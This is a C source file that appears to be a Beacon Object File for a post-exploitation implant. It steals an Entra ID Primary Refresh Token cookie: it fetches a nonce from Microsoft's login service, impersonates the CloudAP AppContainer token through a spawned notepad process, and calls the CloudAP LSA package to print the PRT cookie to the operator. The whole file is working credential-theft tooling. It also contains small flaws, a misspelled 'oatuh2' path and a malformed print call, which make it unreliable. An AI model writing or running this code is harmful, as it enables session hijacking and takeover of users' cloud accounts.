#include <common.h>
#include <custom.h>

void RevertAndCleanup(PROCESS_INFORMATION* pi, HANDLE hImpToken) {
    RevertToSelf();
    if (hImpToken) CloseHandle(hImpToken);
    if (pi->hProcess) {
        TerminateProcess(pi->hProcess, 0);
        CloseHandle(pi->hProcess);
    }
    if (pi->hThread) CloseHandle(pi->hThread);
}

char* GetNonce() {
    HINTERNET hInternet = InternetOpenA("PRT-Requester", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return NULL;

    HINTERNET hConnect = InternetConnectA(hInternet, "login.microsoftonline.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return NULL;
    }

    const char* acceptTypes[] = { "application/json", NULL };
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/common/oauth2/token", NULL, NULL, acceptTypes, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 1);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return NULL;
    }

    const char* headers = "Content-Type: application/x-www-form-urlencoded";
    const char* body = "grant_type=srv_challenge";
    if (!HttpSendRequestA(hRequest, headers, (DWORD)StringLengthA(headers), (LPVOID)body, (DWORD)StringLengthA(body))) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return NULL;
    }

    char responseBuffer[2048];
    MemSet(responseBuffer, 0, sizeof(responseBuffer));
    DWORD bytesRead = 0;
    InternetReadFile(hRequest, responseBuffer, sizeof(responseBuffer) - 1, &bytesRead);
    responseBuffer[bytesRead] = '\0';

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    char* nonce = NULL;
    char* nonceStart = StrStrA(responseBuffer, "\"Nonce\":\"");
    if (nonceStart) {
        nonceStart += 9;
        char* nonceEnd = StrChrA(nonceStart, '"');
        if (nonceEnd) {
            size_t nonceLen = nonceEnd - nonceStart;
            nonce = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nonceLen + 1);
            if (nonce) {
                MemCpy(nonce, nonceStart, nonceLen);
                nonce[nonceLen] = '\0';
            }
        }
    }
    return nonce;
}

BOOL ImpersonateCloudAPContext(PROCESS_INFORMATION* pi, HANDLE* hImpToken) {
    PSID pSid = NULL;
    STARTUPINFOEXW si;
    MemSet(&si, 0, sizeof(si));
    HANDLE hProcToken = NULL;
    SECURITY_CAPABILITIES sc;
    MemSet(&sc, 0, sizeof(sc));
    SIZE_T attrListSize = 0;
    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);

    if (!ConvertStringSidToSidW(L"S-1-15-2-1910091885-1573563583-1104941280-2418270861-3411158377-2822700936-2990310272", &pSid)) {
        return FALSE;
    }

    InitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attrListSize);
    if (!si.lpAttributeList || !InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrListSize)) {
        goto cleanup_fail;
    }

    sc.AppContainerSid = pSid;
    if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_SECURITY_CAPABILITIES, &sc, sizeof(sc), NULL, NULL)) {
        goto cleanup_fail;
    }

    if (!CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, pi)) {
        goto cleanup_fail;
    }

    if (!OpenProcessToken(pi->hProcess, TOKEN_DUPLICATE, &hProcToken)) {
        goto cleanup_fail;
    }

    if (!DuplicateToken(hProcToken, SecurityImpersonation, hImpToken)) {
        goto cleanup_fail;
    }

    if (!ImpersonateLoggedOnUser(*hImpToken)) {
        goto cleanup_fail;
    }

    CloseHandle(hProcToken);
    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    LocalFree(pSid);
    return TRUE;

    cleanup_fail:
    RevertAndCleanup(pi, *hImpToken);
    if (hProcToken) CloseHandle(hProcToken);
    if (si.lpAttributeList) {
        DeleteProcThreadAttributeList(si.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    }
    if(pSid) LocalFree(pSid);
    return FALSE;
}

int go() {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Attempting to request PRT cookie...\n");

    char* nonce = GetNonce();
    if (!nonce) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to get nonce.\n");
        return 1;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully obtained nonce: %s\n", nonce);

    PROCESS_INFORMATION pi;
    MemSet(&pi, 0, sizeof(pi));
    HANDLE hImpToken = NULL;

    if (!ImpersonateCloudAPContext(&pi, &hImpToken)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to impersonate the necessary security context.\n");
        HeapFree(GetProcessHeap(), 0, nonce);
        return 1;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully impersonated CloudAP security context.\n");

    HANDLE hLsa = NULL;
    if (LsaConnectUntrusted(&hLsa) != 0) {
        RevertAndCleanup(&pi, hImpToken);
        HeapFree(GetProcessHeap(), 0, nonce);
        return 1;
    }

    LSA_STRING packageName;
    RtlInitAnsiString(&packageName, "CloudAP");
    ULONG authPackage;
    if (LsaLookupAuthenticationPackage(hLsa, &packageName, &authPackage) != 0) {
        LsaDeregisterLogonProcess(hLsa);
        RevertAndCleanup(&pi, hImpToken);
        HeapFree(GetProcessHeap(), 0, nonce);
        return 1;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Found CloudAP authentication package.\n");

    char payload[2048];
    MemSet(payload, 0, sizeof(payload));
    LPCSTR part1 = "{\"call\": 2, \"payload\":\"https:\\/\\/login.microsoftonline.com\\/common\\/oatuh2\\/authorize?sso_nonce=";
    LPCSTR part3 = "\", \"correlationId\":\"\"}";
    lstrcpyA(payload, part1);
    lstrcatA(payload, nonce);
    lstrcatA(payload, part3);

    int payloadLength = StringLengthA(payload);
    ULONG inputSize = sizeof(CAP_PKG_INPUT) - 1 + payloadLength;
    PCAP_PKG_INPUT inputBuffer = (PCAP_PKG_INPUT)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, inputSize);

    if (inputBuffer) {
        inputBuffer->ulMessageType = 2;
        inputBuffer->ProviderGuid = (GUID){ 0xb16898c6, 0xa148, 0x4967, { 0x91, 0x71, 0x64, 0xd7, 0x55, 0xda, 0x85, 0x20 } };
        inputBuffer->ulInputSize = payloadLength;
        MemCpy(inputBuffer->abInput, payload, payloadLength);

        PVOID responseBuffer = NULL;
        ULONG responseLength = 0;
        NTSTATUS protocolStatus;
        NTSTATUS status = LsaCallAuthenticationPackage(hLsa, authPackage, inputBuffer, inputSize, &responseBuffer, &responseLength, &protocolStatus);

        if (status == 0 && protocolStatus == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "\n[+] LsaCallAuthenticationPackage successful!\n");
            BeaconPrintf(CALLBACK_OUTPUT, "-- PRT Cookie Response --\n");
            BeaconPrintf(CALLBACK_OUTPUT, GetStdHandle(STD_OUTPUT_HANDLE), responseBuffer, responseLength, NULL, NULL);
            BeaconPrintf(CALLBACK_OUTPUT, "\n---------------------------\n");
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] LsaCallAuthenticationPackage failed. Status: 0x%lx, ProtocolStatus: 0x%lx\n", status, protocolStatus);
        }

        if (responseBuffer) LsaFreeReturnBuffer(responseBuffer);
        HeapFree(GetProcessHeap(), 0, inputBuffer);
    }

    LsaDeregisterLogonProcess(hLsa);
    RevertAndCleanup(&pi, hImpToken);
    HeapFree(GetProcessHeap(), 0, nonce);

    return 0;
}
